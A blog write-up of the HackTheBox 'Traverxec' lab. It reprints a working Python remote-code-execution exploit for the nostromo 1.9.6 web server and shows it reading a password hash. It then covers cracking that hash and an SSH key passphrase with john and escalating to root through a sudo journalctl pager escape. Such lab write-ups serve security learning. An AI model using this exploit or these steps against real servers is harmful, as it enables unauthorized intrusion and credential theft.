---
title: HackTheBox Traverxec
author: Marius Kimmina
date: 2020-04-11 14:10:00 +0800
categories: [CTF, HackTheBox]
tags: [BSD]
published: true
---

# 0x0 Introduction
Yet another HTB box and again one of the easier ones. This time we had to exploit a vulnerable nostromo webserver version for command execution and then escalate privileges from there. 
![image](/assets/images/traverxec_htb_info.png "Traverxec Logo")

# 0x1 Getting a foothold

Starting of as usual with a nmap scan I got the following result: 

```
# Nmap 7.80 scan initiated Mon Feb 10 08:20:59 2020 as: nmap -sV -sC -oA nmap/nmap 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.0061s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 10 08:21:11 2020 -- 1 IP address (1 host up) scanned in 12.31 seconds
```

I had never heard of nostromo before but a quick google search told me that it's an open source webserver that is common on BSD and is also called nhttpd.  
When I searched for the version number I immediately found an RCE vulnerability and a python script to exploit it.  

```py
#!/usr/bin/env python

import socket
import argparse

parser = argparse.ArgumentParser(description='RCE in Nostromo web server through 1.9.6 due to path traversal.')
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
parser.add_argument('cmd',help='command to execute, default is id',default='id',nargs='?')
args = parser.parse_args()

def recv(s):
	r=''
	try:
		while True:
			t=s.recv(1024)
			if len(t)==0:
				break
			r+=t
	except:
		pass
	return r
def exploit(host,port,cmd):
	s=socket.socket()
	s.settimeout(1)
	s.connect((host,int(port)))
	payload="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1""".format(cmd)
	s.send(payload)
	r=recv(s)
	r=r[r.index('\r\n\r\n')+4:]
	print r

exploit(args.host,args.port,args.cmd)
```

The vulnerability here is a path traversal that allows us to reach /bin/sh
Which is also very simple to use 

```
mindslave@kalibox:~/hackthebox/Traverxec/nostromo$ python2 exp.py 10.10.10.165 80 "whoami"

www-data
```


# 0x2 getting the user.txt

As www-data I usually first want to look in our own directory because that's were we are most likely to have access. so thats /var/nostromo in this case.  
In there I found a conf directory and was able to extract a hash from the .htpasswd file inside.

```
mindslave@kalibox:~/hackthebox/Traverxec/nostromo$ python2 exp.py 10.10.10.165 80 "cat /var/nostromo/conf/.htpasswd"

david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Copied the credentials over to my maschine and asked my friend john if he could tell me something about them

```
mindslave@kalibox:~/hackthebox/Traverxec/nostromo/creds$ cat pwfile 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
mindslave@kalibox:~/hackthebox/Traverxec/nostromo/creds$ john --wordlist=/usr/share/wordlists/rockyou.txt pwfile 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:00:24 DONE (2020-02-10 09:50) 0.04027g/s 426034p/s 426034c/s 426034C/s NuiMeanPoon..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now we have password "Nowonly4me". First thing I tested with this password was ssh of course, but sadly david did not use that as his ssh password.  
Going further throught the nhttpd.conf I found the following:

```
# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd
```

This stells us that we can use the password to authenticate at the Website, the question left to be answered is where on the Website.
looking at the Nostromo documentation I found that users get a path on the Webserver, here the relevant part of the docs:

```
HOMEDIRS
To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example:
http://www.nazgul.ch/~hacki/
The content of the home directory is handled exactly the same way as a directory in your document root. If some users don't want that their home directory can be accessed via HTTP, they shall remove the world readable flag on their home directory and a caller will receive a 403 Forbidden response. Also, if basic authentication is enabled, a user can create an .htaccess file in his home directory and a caller will need to authenticate.
You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option.
```

so the /~david/ path did exists but didn't show us anything interesting, we need some kind of file name which we could find in /home/david/public_www/ the fiel we need is called protected-file-area (I knew the public_www existed because it said so in the nostromo config file)

The next step was to go to http://10.10.10.165/~/david/protected-file-area, there we could use the 'nowonly4me' password and we got his ssh-key which we could then again decrypt with john

```
$ python3 /usr/share/john/ssh2john.py id_rsa > johnfile
```

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt johnfile 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:02 DONE (2020-02-10 10:50) 0.3597g/s 5158Kp/s 5158Kc/s 5158KC/sa6_123..*7¡Vamos!
Session completed
```

log in with ssh
```
$ ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Mon Feb 10 04:51:07 2020 from 10.10.14.2
david@traverxec:~$
```


# 0x3 getting the root.txt

In davids "bin" directoy I found an interesting script 

```bash
$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

Here I only care about the last line "/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat" which means we can execute this journalctl command as root and if we do that, without piping it into cat, we invoke the default pager, most likely "less", as root. And inside of less we can execute "!/bin/sh" that will run as root and thus give us a root shell. 

```
$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service;
-- Logs begin at Tue 2020-02-11 01:12:26 EST, end at Tue 2020-02-11 02:02:57 EST. --
Feb 11 01:12:29 traverxec nhttpd[422]: started
Feb 11 01:12:29 traverxec nhttpd[422]: max. file descriptors = 1040 (cur) / 1040 (max)
Feb 11 01:12:29 traverxec systemd[1]: Started nostromo nhttpd server.
Feb 11 02:01:17 traverxec sudo[1626]: pam_unix(sudo:auth): authentication failure; logname= uid
Feb 11 02:01:53 traverxec sudo[1626]: www-data : command not allowed ; TTY=pts/1 ; PWD=/usr/bin
!/bin/sh
# whoami
root
```
